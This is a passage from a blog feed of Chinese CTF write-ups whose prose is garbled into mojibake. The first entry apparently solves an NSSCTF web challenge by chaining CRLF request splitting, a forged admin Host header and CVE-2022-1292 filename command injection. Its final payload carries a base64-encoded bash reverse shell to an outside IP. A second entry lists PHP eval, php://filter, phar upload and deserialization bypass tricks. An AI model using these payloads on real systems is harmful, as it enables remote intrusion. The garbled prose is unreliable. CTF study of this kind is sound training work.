href="https://xz.aliyun.com/t/11703?time__1311=mqmx0DBDc737qx0vo4%2BxCTPQqGK6oO7irTD&amp;alichlgref=https%3A%2F%2Fwww.nssctf.cn%2F">CVE-2022-1292çš„åˆ†æ</a><br>æŸ¥çœ‹æ–‡ç« ä¼šå‘ç°å½“æ‰§è¡Œè¿™ä¸ªå‘½ä»¤æ—¶å¦‚æœè¯ä¹¦æ–‡ä»¶åä¸­åŒ…å«<code>`ä¼šè¿›è¡Œå‘½ä»¤æ‰§è¡Œ.é‚£ä¹ˆæˆ‘ä»¬åªè¦èƒ½æ‰¾åˆ°æ–¹æ³•ä¿®æ”¹æ–‡ä»¶åå³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ.æˆ‘ä»¬çœ‹é“æœ€åä¸€ä¸ªè·¯ç”±å‘ç°å…¶å¯ä»¥è®¿é—®å†…ç½‘.æˆ‘ä»¬çœ‹ä¸€ä¸‹å†…ç½‘çš„goè¯­è¨€æºç <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>æˆ‘ä»¬å‘ç°å…¶/admin/renameè·¯ç”±æ˜¯æ–‡ä»¶åä¿®æ”¹çš„è·¯ç”±ï¼Œé‚£ä¹ˆæ€è·¯ä¸€ä¸‹å­å°±æ¸…æ™°äº†ã€‚<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">staticPath := <span class="string">&quot;/app/static/crt/&quot;</span></span><br><span class="line">oldname := c.DefaultQuery(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">newname := c.DefaultQuery(<span class="string">&quot;newname&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> oldname == <span class="string">&quot;&quot;</span> || newname == <span class="string">&quot;&quot;</span> || strings.Contains(oldname, <span class="string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">c.String(<span class="number">500</span>, <span class="string">&quot;error&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, newname)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;no&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>ä½†æ˜¯æˆ‘ä»¬ä¼šçœ‹åˆ°æƒ³è¦ä¿®æ”¹æ–‡ä»¶çš„åå­—éœ€è¦å…ˆç»•è¿‡è¿™ä¸¤ä¸ª<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> </span><br></pre></td></tr></table></figure>é¦–å…ˆæ˜¯å‰ä¸€ä¸ªï¼Œå…¶æ˜¯è·å–åŸå§‹çš„urlåœ¨å®˜æ–¹æ–‡æ¡£é‡Œå†™äº†ï¼Œå½“è¯·æ±‚çš„urlè·¯å¾„ä¸­å­˜åœ¨urlå­—ç¬¦æ—¶ä¼šè·å–åˆ°urlï¼Œä½†æ˜¯ä¸å«æœ‰urlå­—ç¬¦æ—¶å°±æœ‰å¯èƒ½è·å–åˆ°ç©ºã€‚å³æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å…¶ä¸­ä¸€ä¸ª/ä¸¤å±‚urlç¼–ç ä½¿å…¶ä¼ åˆ°åç«¯æ—¶è¢«ä¸€æ¬¡urldecodeåä»ç„¶ä¸ºurlç¼–ç å­—ç¬¦ã€‚è€Œç¬¬äºŒä¸ªæˆ‘ä»¬å¯ä»¥å°†æŠ¥æ–‡å½“æˆå‚æ•°ä¼ å…¥ã€‚å¦‚åœ¨httpæŠ¥æ–‡ä¸­æ¢è¡Œç¬¦ä¸º</code>\r\n`é‚£ä¹ˆæˆ‘ä»¬å°†å…¶urlç¼–ç åä¼ å…¥åå°±ä¼šè¢«è§£æä¸ºæ¢è¡Œç¬¦<br>æˆ‘å…ˆä¸¾ä¸ªhttpæŠ¥æ–‡çš„ä¾‹å­<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /proxy HTTP/1.1\r\nHost: node4.anna.nssctf.cn:28745</span><br><span class="line">ç­‰äº</span><br><span class="line">GET /proxy HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28745</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ„é€ uriæ¥ä½¿çš„Hostè¢«è·å–ä¸ºadminä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uri=xxxxxxx%20HTTP/1.1%0D%0AHost:admin%0D%0A%0D%0A</span><br></pre></td></tr></table></figure><br>æœ«å°¾éœ€è¦ä¸¤ä¸ªæ¢è¡Œç¬¦æ‰å¯ä»¥è¯·æ±‚æˆåŠŸã€‚è¿™æ˜¯httpçš„æŠ¥æ–‡æ ¼å¼è¦æ±‚çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨bpé‡ŒæŸ¥çœ‹æ¢è¡Œç¬¦çš„ä½ç½®æ¥äº†è§£<br>æ—¢ç„¶ç»•è¿‡äº†æˆ‘ä»¬å°±å¼€å§‹å°è¯•æ„é€ æ‰§è¡Œçš„å‘½ä»¤<br>ç¬¬ä¸€æ€è·¯è‡ªç„¶æ˜¯å¼¹ä¸ªshelläº†ã€‚ç”±äºæ²¡æœ‰è¿‡æ»¤æˆ‘å°±ç›´æ¥å°è¯•ä½¿ç”¨bashåå¼¹ä»£ç å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newname=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTExLjIzMC4zOC4xNTkvNzc3NyAwPiYx|base64 --decode|bash`.crt</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è¿™ä¸ªæ˜¯æˆ‘ä»¬è¦è¿›è¡ŒäºŒæ¬¡ä¼ å‚çš„å‚æ•°ï¼Œç”±äºç©ºæ ¼è¿™ç§åˆ†éš”ç¬¦åœ¨getä¼ å€¼çš„æ—¶å€™å¿…é¡»è¿›è¡Œurlç¼–ç æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹å‚æ•°ç©ºæ ¼è¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œä¸ç„¶ä¼šæŠ¥é”™<br>å°†ä¸Šé¢çš„å‡ ç§æ•´åˆåœ¨ä¸€èµ·ï¼Œå¹¶å°†ç‰¹æ®Šå­—ç¬¦è¿›è¡Œä¸€æ¬¡urlç¼–ç å¾—åˆ°ä¸‹é¢çš„å†…å®¹,å½“ç„¶å…¶å®åªè¦å°†&amp;ç©ºæ ¼æ¢è¡Œç¬¦è¿™ç§ç‰¹æ®Šçš„åˆ†éš”ç¬¦è¿›è¡Œurldecodeå°±å¯ä»¥äº†ã€‚åœ¨ä¼šè¿›è¡ŒäºŒæ¬¡ä¼ å‚çš„åœ°æ–¹è¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œå³å¯ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uri=/admin%252Frename%3Foldname%3D53753e06-b537-4d1e-af1f-6225747dd3ae.crt%26newname=%60echo%2520c2ggLWkgPiYgL2Rldi90Y3AvMTExLjIzMC4zOC4xNTkvNzc3NyAwPiYx%7Cbase64%2520--decode%7Cbash%60.crt%20HTTP/1.1%0D%0AHost:admin%0D%0A%0D%0A</span><br></pre></td></tr></table></figure><br>ç”±äºä»£ç è·å–uriçš„è·å–formçš„uriå³åœ¨postä¼ å‚çš„uriä½†æ˜¯ç”±äºè¿™ä¸ªè·¯ç”±åªèƒ½å¤„ç†GETä¼ å‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æŠ¥æ–‡ä¸­çš„POSTæ”¹ä¸ºGET<br></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> åˆ·é¢˜ </category>
          
          <category> NSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYå­¦åˆ°çš„çŸ¥è¯†</title>
      <link href="/2024/04/14/XY%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/04/14/XY%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="æ„Ÿè§‰è‡ªå·±è¶Šæ¥è¶Šæ‡’äº†è¿™ä¸ªæ–‡ä»¶åˆ›å»ºäº†å¾ˆä¹…ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰åšå¥½æ€»ç»“"><a href="#æ„Ÿè§‰è‡ªå·±è¶Šæ¥è¶Šæ‡’äº†è¿™ä¸ªæ–‡ä»¶åˆ›å»ºäº†å¾ˆä¹…ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰åšå¥½æ€»ç»“" class="headerlink" title="æ„Ÿè§‰è‡ªå·±è¶Šæ¥è¶Šæ‡’äº†è¿™ä¸ªæ–‡ä»¶åˆ›å»ºäº†å¾ˆä¹…ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰åšå¥½æ€»ç»“"></a>æ„Ÿè§‰è‡ªå·±è¶Šæ¥è¶Šæ‡’äº†è¿™ä¸ªæ–‡ä»¶åˆ›å»ºäº†å¾ˆä¹…ï¼Œä½†æ˜¯ä¸€ç›´æ²¡æœ‰åšå¥½æ€»ç»“</h1><h1 id="1-rceåæ‹¼æ¥å­—ç¬¦æ—¶ç»•è¿‡çš„æ–¹æ³•"><a href="#1-rceåæ‹¼æ¥å­—ç¬¦æ—¶ç»•è¿‡çš„æ–¹æ³•" class="headerlink" title="1.rceåæ‹¼æ¥å­—ç¬¦æ—¶ç»•è¿‡çš„æ–¹æ³•"></a>1.rceåæ‹¼æ¥å­—ç¬¦æ—¶ç»•è¿‡çš„æ–¹æ³•</h1><p>åœ¨xyæ—¶æˆ‘ç¢°åˆ°äº†æ–°çš„ç»•è¿‡æ–¹æ³•ï¼Œä¹‹å‰æˆ‘æœ‰äº†è§£åˆ°å¯ä»¥ä½¿ç”¨#å’ŒçŸ­æ ‡ç­¾&lt;?=?&gt;æ¥è¿›è¡Œç»•è¿‡ï¼Œä½†è¿™æ¬¡æ¯”èµ›å¹¶ä¸å¯ä»¥ã€‚äºæ˜¯æˆ‘å°±åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†è¿™ä¸ªæ–°æ–¹æ³•ã€‚</p><h2 id="ä½¿ç”¨pharæ–‡ä»¶å°¾æ¥æˆªæ–­ä»£ç ï¼Œå®ç°ç»•è¿‡ã€‚"><a href="#ä½¿ç”¨pharæ–‡ä»¶å°¾æ¥æˆªæ–­ä»£ç ï¼Œå®ç°ç»•è¿‡ã€‚" class="headerlink" title="ä½¿ç”¨pharæ–‡ä»¶å°¾æ¥æˆªæ–­ä»£ç ï¼Œå®ç°ç»•è¿‡ã€‚"></a>ä½¿ç”¨pharæ–‡ä»¶å°¾æ¥æˆªæ–­ä»£ç ï¼Œå®ç°ç»•è¿‡ã€‚</h2><p>å¦‚æ ‡é¢˜å½“phpæ–‡ä»¶åœ¨æ‰§è¡Œä»£ç æ—¶é‡åˆ°pharæ–‡ä»¶å°¾æ—¶æ•ˆæœä¸?&gt;ç›¸ä¼¼ä¸ä¼šè§£æåé¢çš„ä»£ç ä¹Ÿå°±ä¸ä¼šå‡ºç°åé¢çš„æŠ¥é”™ã€‚<br><img src="/2024/04/14/XY%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86/phar1.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°å³ä½¿åœ¨æ–‡ä»¶å°¾åé¢å‡ºç°ä¸¥é‡çš„è¯­æ³•é”™è¯¯ä¹Ÿä¸ä¼šæŠ¥é”™ç¨‹åºä¼šæ­£å¸¸è¿è¡Œ<br>é‚£ä¹ˆåœ¨é‡åˆ°å¦‚ä¸‹ä»£ç æ—¶æˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ç»•è¿‡<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[cmd];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/#|&lt;|&gt;/&quot;</span>,<span class="variable">$cmd</span>);)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>.<span class="string">&quot;lalalala&quot;</span>);</span><br></pre></td></tr></table></figure><br>å½“é‡åˆ°å¦‚ä¸Šçš„é¢˜ç›®å³å¯ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=phpinfo();__HALT_COMPILER();</span><br></pre></td></tr></table></figure></p><h1 id="2-åœ¨æ–‡ä»¶åŒ…å«æ—¶ä½¿ç”¨php-filterä¼ªåè®®çš„è¿‡æ»¤å™¨æ¥ä»»æ„æ„é€ å­—ç¬¦ä¸²ã€‚"><a href="#2-åœ¨æ–‡ä»¶åŒ…å«æ—¶ä½¿ç”¨php-filterä¼ªåè®®çš„è¿‡æ»¤å™¨æ¥ä»»æ„æ„é€ å­—ç¬¦ä¸²ã€‚" class="headerlink" title="2.åœ¨æ–‡ä»¶åŒ…å«æ—¶ä½¿ç”¨php://filterä¼ªåè®®çš„è¿‡æ»¤å™¨æ¥ä»»æ„æ„é€ å­—ç¬¦ä¸²ã€‚"></a>2.åœ¨æ–‡ä»¶åŒ…å«æ—¶ä½¿ç”¨php://filterä¼ªåè®®çš„è¿‡æ»¤å™¨æ¥ä»»æ„æ„é€ å­—ç¬¦ä¸²ã€‚</h1><p><a href="https://tttang.com/archive/1395/#toc_php-base64-filter">hxp CTF 2021 - The End Of LFI?</a><br>è¿™ç¯‡æ–‡ç« å†™äº†åœ¨è¿›è¡ŒLFIè¿›è¡Œæ–‡ä»¶åŒ…å«æ—¶ä½¿ç”¨filterè¿‡æ»¤å™¨æ¥æ„é€ å­—ç¬¦ã€‚å®ç°ä»æ–‡ä»¶åŒ…å«åˆ°å‘½ä»¤æ‰§è¡Œçš„æ¼æ´å‡çº§ã€‚ï¼ˆåªèƒ½è¯´çœŸçš„é…·ï¼‰<br>å™¨åŸç†æ—¶å€ŸåŠ©å­—ç¬¦é›†è½¬æ¢æ—¶äº§ç”Ÿçš„ä¸€äº›å­—æ¯ï¼Œå¹¶ä½¿ç”¨convert.base64-encodeè¿‡æ»¤å™¨ä¼šå°†ébase64å­—ç¬¦çš„ç»™è¿›è¡Œæ¸…é™¤çš„ç‰¹æ€§æ¥æ„é€ å‡ºå­—ç¬¦ã€‚é‡å¤ä»¥ä¸Šæ­¥éª¤å°±å¯ä»¥æ„é€ å‡ºè‡ªå·±æƒ³æ„é€ çš„å­—ç¬¦ã€‚ï¼ˆå‘ç°è¿™ä¸ªçš„äººå¤ªå¼ºäº†ã€‚orzï¼‰<br>åœ¨XYä¸­è€ƒå¯Ÿçš„æ˜¯åˆ©ç”¨è¿‡æ»¤å™¨å’Œ/etc/passwdæ–‡ä»¶æ„å»ºXYCTFã€‚è¿™ä¸ªæ„å»ºæ–¹æ³•å…‰çœ‹æ–‡ç« æ˜¯æ— æ³•å®ç°çš„ã€‚ä½†æ˜¯çœ‹ç€æ–‡ç« è¿›è¡Œç†è§£æ€è€ƒå°±å¯ä»¥å†™å‡ºæ¥<br>è¿™é‡Œæˆ‘è¿˜æœ‰è´´ä¸€ä¸‹pç‰›çš„æ–‡ç« <br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#reply-list">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a><br>åªèƒ½è¯´pç‰›ä¸æ„§æ˜¯pç‰›å¤§ä½¬å¥½å‡ å¹´å‰ç©å‰©ä¸‹çš„ï¼Œéƒ½å¤Ÿæˆ‘è¿™ä¸ªæ¸£æ¸£å–ä¸Šä¸€å£¶<br>è¿™ç¯‡æ–‡ç« æåˆ°äº†åˆ©ç”¨convert.base64-encodeçš„å®½æ³›æ€§å’Œstring.strip_tagsæ¥ç»•è¿‡æ­»äº¡exit<br>å…¶ä¸­string.strip_tagså¯ä»¥ç›´æ¥åˆ é™¤æ ‡ç­¾å†…çš„å†…å®¹ï¼Œå³å…¶ä¼šåˆ é™¤å¦‚ä¸‹å­—ç¬¦ä¸²<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phplalalalalla?&gt;</span><br><span class="line">&lt;?lalallalalal</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆæˆ‘ä»¬åªè¦æ„é€ å‡ºXYCTF&lt;?å†åŠ ä¸Šè¿™ä¸ªè¿‡æ»¤å™¨ä¸å°±è¿åˆƒè€Œè§£äº†å—ï¼Ÿ</p><h1 id="3-pharæ–‡ä»¶ä¸Šä¼ æ—¶çš„ä¸€äº›ç»•wafå°æŠ€å·§"><a href="#3-pharæ–‡ä»¶ä¸Šä¼ æ—¶çš„ä¸€äº›ç»•wafå°æŠ€å·§" class="headerlink" title="3.pharæ–‡ä»¶ä¸Šä¼ æ—¶çš„ä¸€äº›ç»•wafå°æŠ€å·§"></a>3.pharæ–‡ä»¶ä¸Šä¼ æ—¶çš„ä¸€äº›ç»•wafå°æŠ€å·§</h1><p>å‚è€ƒæ–‡ç« <a href="https://www.freebuf.com/articles/web/291992.html">pharååºåˆ—åŒ–æ€»ç»“</a></p><h2 id="1-åç¼€æˆ–è€…æ–‡ä»¶å¤´éªŒè¯"><a href="#1-åç¼€æˆ–è€…æ–‡ä»¶å¤´éªŒè¯" class="headerlink" title="1.åç¼€æˆ–è€…æ–‡ä»¶å¤´éªŒè¯"></a>1.åç¼€æˆ–è€…æ–‡ä»¶å¤´éªŒè¯</h2><p>pharæ–‡ä»¶çš„è¯†åˆ«å’Œä½¿ç”¨phar://ä¼ªåè®®æ¥æ—¶matedataåºåˆ—åŒ–åªä¸å…¶æ–‡ä»¶å°¾æœ‰å…³å³æˆ‘ä»¬å¯ä»¥å†æ–‡ä»¶å¤´éƒ¨æ·»åŠ ç…§ç‰‡æ–‡ä»¶çš„æ–‡ä»¶å¤´æˆ–è€…éšæ„ä¿®æ”¹åç¼€å…¶å¹¶ä¸å½±å“å…¶phar://å¯¹å…¶çš„å¤„ç†</p><h2 id="2-æ£€æµ‹pharæ–‡ä»¶å°¾"><a href="#2-æ£€æµ‹pharæ–‡ä»¶å°¾" class="headerlink" title="2.æ£€æµ‹pharæ–‡ä»¶å°¾"></a>2.æ£€æµ‹pharæ–‡ä»¶å°¾</h2><p>pharæ–‡ä»¶æ˜¯å¿…é¡»è¦æœ‰æ–‡ä»¶å°¾æ‰å¯ä»¥è¢«phar://æ‰€è¯†åˆ«ï¼Œä½¿ç”¨æˆ‘ä»¬çš„pharæ–‡ä»¶æ˜¯å¿…é¡»æœ‰<strong>HALT_COMPILER()ï¼Œç»•è¿‡æ–¹å¼ä¹Ÿä¸éš¾å¯ä»¥ä½¿ç”¨liunxçš„gzipæ¥å‹ç¼©æ–‡ä»¶ï¼Œå†å‹ç¼©ä¹‹åå°±ä¸å­˜åœ¨</strong>HALT_COMPILER()äº†ï¼Œè€Œä¸”ä»ç„¶å¯ä»¥è¢«phar://æ‰€å¤„ç†ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip phar.phar</span><br></pre></td></tr></table></figure></p><h2 id="3-æ— æ³•å†å¼€å¤´ä½¿ç”¨phar-æ¥è§¦å‘"><a href="#3-æ— æ³•å†å¼€å¤´ä½¿ç”¨phar-æ¥è§¦å‘" class="headerlink" title="3.æ— æ³•å†å¼€å¤´ä½¿ç”¨phar://æ¥è§¦å‘"></a>3.æ— æ³•å†å¼€å¤´ä½¿ç”¨phar://æ¥è§¦å‘</h2><p>è¿™ä¸ªçš„ç»•è¿‡æ–¹æ³•æœ‰å¾ˆå¤šå› ä¸ºå…¶åªæ£€æµ‹å…¶æ˜¯å¦åœ¨å¼€å¤´ï¼Œæˆ‘ä»¬åªè¦ä½¿ç”¨ä¼ªåè®®åµŒå¥—å³å¯ç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> Bzip/Gzip å½“ç¯å¢ƒé™åˆ¶äº†pharä¸èƒ½å‡ºç°åœ¨å‰é¢çš„å­—ç¬¦é‡Œã€‚å¯ä»¥ä½¿ç”¨compress.bzip2://å’Œcompress.zlib://ç»•è¿‡</span><br><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///home/sx/test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br><span class="line">// è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡</span><br><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure></p><h1 id="4-ååºåˆ—åŒ–çš„å°trick-è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡"><a href="#4-ååºåˆ—åŒ–çš„å°trick-è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡" class="headerlink" title="4.ååºåˆ—åŒ–çš„å°trick// è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡"></a>4.ååºåˆ—åŒ–çš„å°trick// è¿˜å¯ä»¥ä½¿ç”¨ä¼ªåè®®çš„æ–¹æ³•ç»•è¿‡</h1><p>å‚è€ƒæ–‡ç« <a href="https://m.freebuf.com/articles/web/338693.html">ååºåˆ—åŒ–åŠå¸¸ç”¨trick</a><br>åœ¨å†™xy phpå¥—å¨ƒçš„é¢˜ç›®æ—¶è€—æ—¶æœ€ä¹…çš„ä¸æ˜¯æœ€åä¸€ä¸ªè€Œæ˜¯ç¬¬ä¸€ä¸ªï¼Œå…¶ä¸­ä¸€ä¸ªéå¸¸ç®€å•çš„trickç»™æˆ‘æå¿˜äº†ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><h2 id="ä½¿ç”¨-amp-æ¥ä¼ å€ä½¿å¾—ä¸¤ä¸ªå±æ€§çš„å€¼å§‹ç»ˆç›¸ç­‰"><a href="#ä½¿ç”¨-amp-æ¥ä¼ å€ä½¿å¾—ä¸¤ä¸ªå±æ€§çš„å€¼å§‹ç»ˆç›¸ç­‰" class="headerlink" title="ä½¿ç”¨&amp;æ¥ä¼ å€ä½¿å¾—ä¸¤ä¸ªå±æ€§çš„å€¼å§‹ç»ˆç›¸ç­‰"></a>ä½¿ç”¨&amp;æ¥ä¼ å€ä½¿å¾—ä¸¤ä¸ªå±æ€§çš„å€¼å§‹ç»ˆç›¸ç­‰</h2><p>å­¦è¿‡cè¯­è¨€å¯¹ä¼ å€åº”è¯¥ä¸é™Œç”Ÿå³<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=$_POST[1];</span><br><span class="line">$b=&amp;$a;</span><br></pre></td></tr></table></figure><br>è¿™æ—¶éšä¾¿ä¿®æ”¹å˜é‡aï¼Œbä¹Ÿä¼šå‘ç”Ÿæ”¹å˜</p><h1 id="5-sstiçš„ç»•wafæŠ€å·§"><a href="#5-sstiçš„ç»•wafæŠ€å·§" class="headerlink" title="5.sstiçš„ç»•wafæŠ€å·§"></a>5.sstiçš„ç»•wafæŠ€å·§</h1><p>è¿™ä¸ªçš„å†…å®¹æœ‰ç‚¹å¤ªå¤šäº†æˆ‘å°±ç›´æ¥è´´æˆ‘çœ‹çš„æ–‡ç« å°±å¥½äº†<br><a 